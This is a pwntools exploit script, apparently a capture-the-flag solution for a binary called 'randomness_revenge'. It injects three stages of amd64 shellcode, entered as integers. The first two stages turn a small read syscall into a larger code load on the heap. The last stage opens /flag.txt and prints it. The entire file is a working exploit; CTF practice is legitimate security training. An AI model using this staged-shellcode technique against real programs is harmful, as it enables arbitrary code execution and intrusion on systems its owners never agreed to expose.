# author: brwook
from pwn import *

context.arch = 'amd64'

p = process('./randomness_revenge', aslr=1)
# p = remote('pwn.1337.sb', 10005)
shellcode = asm('''
    xor eax, eax
    syscall
    xor edi, edi
    mov bl, 0
''')
# "syscall" makes RCX register into heap address, and idky
# "mov bl, 0" is needed for ignoring last 1-byte

shellcode2 = asm('''
    push rcx
    pop rsi
    xor eax, eax
    syscall
''')
# read(0, heap, dummy size);

shellcode3 = shellcraft.openat(0, "/flag.txt", 0, 0)
shellcode3 += shellcraft.read('rax', 'rsp', 0x40)
shellcode3 += shellcraft.write(1, 'rsp', 0x40)

log.info(f"length of 1st shellcode : {len(shellcode)}")
log.info(f"length of 2nd shellcode : {len(shellcode2)}")
p.sendlineafter(b"number: ", b'2')
p.sendlineafter(b'> ', str(u64(shellcode)).encode())
p.sendlineafter(b'> ', str(u64(shellcode2.ljust(8, b'\x90'))).encode())
p.send(b'\x90' * 0xA + asm(shellcode3))
p.interactive()